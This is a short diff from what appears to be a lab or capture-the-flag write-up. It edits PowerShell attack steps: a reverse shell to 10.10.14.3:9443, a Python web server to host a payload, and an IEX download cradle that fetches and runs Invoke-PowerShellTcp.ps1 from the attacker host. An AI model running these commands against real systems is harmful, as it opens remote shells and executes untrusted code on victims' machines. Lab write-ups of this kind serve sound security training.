@@ -86,7 +86,7 @@ $s.Send($command)
 ```powershell
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
 
-$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
-
 python3 -m http.server 8080
+
+$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/Invoke-PowerShellTcp.ps1')"
 ```
